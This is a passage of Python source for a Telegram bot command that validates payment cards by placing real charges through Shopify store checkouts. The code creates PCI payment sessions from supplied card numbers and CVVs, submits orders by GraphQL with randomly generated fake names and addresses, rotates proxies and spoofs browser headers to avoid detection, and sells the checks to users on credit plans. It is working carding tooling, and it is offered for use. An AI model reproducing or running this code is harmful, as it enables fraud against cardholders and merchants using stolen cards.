            if not signed_handles:
                signed_handles = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html_content)
            self.signed_handles = [h.replace('\\n', '').replace('\\r', '') for h in signed_handles]
            
            # Construct GraphQL session token
            self.graphql_session_token = self.construct_graphql_session_token()
            
            return True if self.session_token else False
            
        except Exception as e:
            self.logger.error_log("METADATA", str(e)[:50])
            return False

    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 6: Create PCI payment session with proper signature"""
        self.step(6, "CREATE PCI SESSION", "Creating payment session with PCI")
        
        pci_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': f'https://checkout.pci.shopifyinc.com/build/{self.build_id[:7]}/number-ltr.html?identifier=&locationURL={self.checkout_url or self.base_url}',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.headers.get('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
            'priority': 'u=1, i'
        }
        
        # Generate signature from checkout page if available
        if hasattr(self, 'signature') and self.signature:
            pci_headers['shopify-identification-signature'] = self.signature
        
        # Format card details
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        month_int = int(mes)
        
        address = self.get_random_address()
        
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": f"{address['firstName']} {address['lastName']}",
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": urllib.parse.urlparse(self.base_url).netloc
        }
        
        try:
            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as pci_client:
                resp = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=pci_headers,
                    json=pci_payload,
                    timeout=30
                )
                
                if resp.status_code in (200, 201):
                    pci_resp = resp.json()
                    payment_session_id = pci_resp.get('id')
                    if payment_session_id:
                        self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...")
                        return True, payment_session_id
                
                return False, f"PCI session failed: {resp.status_code}"
                    
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on PCI: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return False, "PCI_ERROR"

    async def submit_for_completion(self, payment_session_id):
        """Step 7: Submit for completion with proper GraphQL mutation"""
        self.step(7, "SUBMIT PAYMENT", "Submitting payment with GraphQL mutation")
        
        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
        
        graphql_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': self.checkout_url,
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.headers.get('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': self.checkout_token,
            'x-checkout-web-build-id': self.build_id
        }
        
        address = self.get_random_address()
        attempt_token = f"{self.checkout_token}-uaz{self.generate_random_string(9)}"
        stable_id = self.stable_id
        pm_identifier = self.payment_method_identifier or payment_session_id
        
        # Build delivery expectation lines
        delivery_expectation_lines = [{"signedHandle": sh} for sh in self.signed_handles]
        
        MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'''
        
        payload = {
            "query": MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId": self.generate_uuid().upper()
                },
                "input": {
                    "checkpointData": None,
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address['address1'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": address['countryCode'],
                                    "postalCode": address['postalCode'],
                                    "company": address.get('company', ''),
                                    "firstName": address['firstName'],
                                    "lastName": address['lastName'],
                                    "zoneCode": address['zoneCode'],
                                    "phone": address['phone'],
                                    "oneTimeUse": False
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {"phone": address['phone']}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": delivery_expectation_lines
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pm_identifier,
                                    "sessionId": payment_session_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address['address1'],
                                            "address2": "",
                                            "city": address['city'],
                                            "countryCode": address['countryCode'],
                                            "postalCode": address['postalCode'],
                                            "company": address.get('company', ''),
                                            "firstName": address['firstName'],
                                            "lastName": address['lastName'],
                                            "zoneCode": address['zoneCode'],
                                            "phone": address['phone']
                                        }
                                    },
                                    "cardSource": None
                                },
                                "giftCardPaymentMethod": None,
                                "redeemablePaymentMethod": None,
                                "walletPaymentMethod": None,
                                "walletsPlatformPaymentMethod": None,
                                "localPaymentMethod": None,
                                "paymentOnDeliveryMethod": None,
                                "paymentOnDeliveryMethod2": None,
                                "manualPaymentMethod": None,
                                "customPaymentMethod": None,
                                "offsitePaymentMethod": None,
                                "customOnsitePaymentMethod": None,
                                "deferredPaymentMethod": None,
                                "customerCreditCardPaymentMethod": None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument": None
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address['address1'],
                                "address2": "",
                                "city": address['city'],
                                "countryCode": address['countryCode'],
                                "postalCode": address['postalCode'],
                                "company": address.get('company', ''),
                                "firstName": address['firstName'],
                                "lastName": address['lastName'],
                                "zoneCode": address['zoneCode'],
                                "phone": address['phone']
                            }
                        },
                        "creditCardBin": ""
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": "USD",
                            "countryCode": "US"
                        },
                        "email": self.email,
                        "emailChanged": False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [
                            {"sms": {"consentState": "DECLINED", "value": address['phone'], "countryCode": "US"}},
                            {"email": {"consentState": "GRANTED", "value": self.email}}
                        ],
                        "shopPayOptInPhone": {
                            "number": address['phone'],
                            "countryCode": "US"
                        },
                        "rememberMe": False,
                        "setShippingAddressAsDefault": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": [
                            {"key": "gorgias.guest_id", "value": self.client_id or ""},
                            {"key": "gorgias.session_id", "value": self.generate_uuid()}
                        ]
                    },
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {
                        "optIn": {
                            "vaultEmail": "",
                            "vaultPhone": address['phone'],
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "captcha": None,
                    "cartMetafields": []
                }
            }
        }
        
        max_retries = 12
        receipt_id = None
        
        for attempt in range(max_retries):
            try:
                resp = await self.client.post(graphql_url, json=payload, headers=graphql_headers, timeout=30)
                
                if resp.status_code != 200:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return False, f"Submit failed: {resp.status_code}"
                
                result = resp.json()
                
                if 'errors' in result and result.get('data') is None:
                    error_msg = result['errors'][0].get('message', 'GraphQL Error')
                    return False, f"DECLINED - {error_msg[:50]}"
                
                data = result.get('data', {})
                submit = data.get('submitForCompletion', {})
                typename = submit.get('__typename', '')
                
                if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt = submit.get('receipt', {})
                    receipt_id = receipt.get('id')
                    if receipt_id:
                        self.logger.data_extracted("Receipt ID", receipt_id)
                        return True, receipt_id
                    
                elif typename == 'SubmitFailed':
                    reason = submit.get('reason', 'Unknown')
                    return False, f"DECLINED - {reason}"
                    
                elif typename == 'Throttled':
                    poll_after = submit.get('pollAfter', 1000)
                    self.queue_token = submit.get('queueToken', self.queue_token)
                    payload['variables']['input']['queueToken'] = self.queue_token
                    await asyncio.sleep(poll_after / 1000.0)
                    continue
                    
                elif typename == 'CheckpointDenied':
                    return False, "DECLINED - Checkpoint Denied"
                    
                elif typename == 'SubmitRejected':
                    errors = submit.get('errors', [])
                    for error in errors:
                        code = error.get('code', '')
                        if code == 'WAITING_PENDING_TERMS':
                            await asyncio.sleep(0.5)
                            continue
                        return False, f"DECLINED - {code}"
                    
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return False, f"DECLINED - Unknown response: {typename}"
                    
            except httpx.TimeoutException:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return False, "TIMEOUT"
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return False, f"DECLINED - {str(e)[:50]}"
        
        return False, "DECLINED - Max retries exceeded"

    async def poll_for_receipt(self, receipt_id):
        """Step 8: Poll for receipt status"""
        self.step(8, "POLL RECEIPT", f"Polling for receipt: {receipt_id}")
        
        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
        
        graphql_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'referer': self.checkout_url,
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': self.headers.get('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': self.checkout_token,
            'x-checkout-web-build-id': self.build_id
        }
        
        POLL_QUERY = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'''
        
        for poll_attempt in range(15):
            try:
                poll_payload = {
                    "query": POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                
                resp = await self.client.post(graphql_url, json=poll_payload, headers=graphql_headers, timeout=30)
                
                if resp.status_code != 200:
                    await asyncio.sleep(3)
                    continue
                
                result = resp.json()
                receipt = result.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                    self.logger.success_log(f"Order placed successfully! Order ID: {order_id}")
                    return True, "PROCESSED_RECEIPT"
                    
                elif typename == 'ActionRequiredReceipt':
                    # 3DS required
                    self.logger.step(8, "3DS REQUIRED", "Action required - 3DS authentication needed")
                    return True, "3DS_REQUIRED"
                    
                elif typename == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'UNKNOWN')
                    message = error.get('messageUntranslated', '')
                    return False, f"DECLINED - {code}: {message}"
                    
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    delay = receipt.get('pollDelay', 4000)
                    await asyncio.sleep(delay / 1000.0)
                    continue
                    
                else:
                    if poll_attempt < 14:
                        await asyncio.sleep(3)
                        continue
                    return False, f"DECLINED - Unknown receipt status: {typename}"
                    
            except Exception as e:
                if poll_attempt < 14:
                    await asyncio.sleep(3)
                    continue
                return False, f"DECLINED - Poll error: {str(e)[:50]}"
        
        return False, "DECLINED - Polling timeout"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow - FIXED with proper session handling"""
        try:
            # Step 0: Get proxy
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
                self.proxy_status = "Live ⚡️"
                self.proxy_used = True
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30)
            
            # Step 1: Initialize session
            if not await self.get_initial_session():
                return False, "Session init failed"
            await self.random_delay(0.1, 0.2)
            
            # Step 2: Find cheapest product
            if not await self.find_cheapest_product():
                return False, "No product found"
            await self.random_delay(0.1, 0.2)
            
            # Step 3: Add to cart
            if not await self.add_to_cart():
                return False, "Add to cart failed"
            await self.random_delay(0.1, 0.2)
            
            # Step 4: Start checkout
            if not await self.start_checkout():
                return False, "Checkout start failed"
            await self.random_delay(0.1, 0.2)
            
            # Step 5: Get checkout metadata
            if not await self.get_checkout_metadata():
                return False, "Token extraction failed"
            await self.random_delay(0.1, 0.2)
            
            # Step 6: Create PCI session
            success, result = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, result
            payment_session_id = result
            await self.random_delay(0.1, 0.2)
            
            # Step 7: Submit for completion
            success, result = await self.submit_for_completion(payment_session_id)
            if not success:
                return False, result
            receipt_id = result
            await self.random_delay(0.1, 0.2)
            
            # Step 8: Poll for receipt
            success, result = await self.poll_for_receipt(receipt_id)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyRouteChargeChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        """Main card checking method with intelligent parsing"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            # Use intelligent parser to extract card details
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            # Basic validation
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            # Create checker instance
            checker = RouteChargeCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            # Update proxy status
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                cc = parsed[0] if 'parsed' in locals() else ""
                mes = parsed[1] if 'parsed' in locals() else ""
                ano = parsed[2] if 'parsed' in locals() else ""
                cvv = parsed[3] if 'parsed' in locals() else ""
            except:
                cc = mes = ano = cvv = ""
            error_msg = str(e)
            if ":" in error_msg:
                error_msg = error_msg.split(":")[0].strip()
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["sp", ".sp", "$sp"]))
@auth_and_free_restricted
async def handle_shopify_route_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "sp")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sp</code>
🠪 <b>Usage</b>: <code>/sp cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sp 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge</code>""")
            return

        # Get the full message text after the command
        full_text = message.text
        # Remove the command part
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        # Parse using the intelligent parser
        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details. Please use format like:
🠪 <b>Format 1</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 1.00$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyRouteChargeChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="sp",
                    gateway_name="Shopify Charge"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
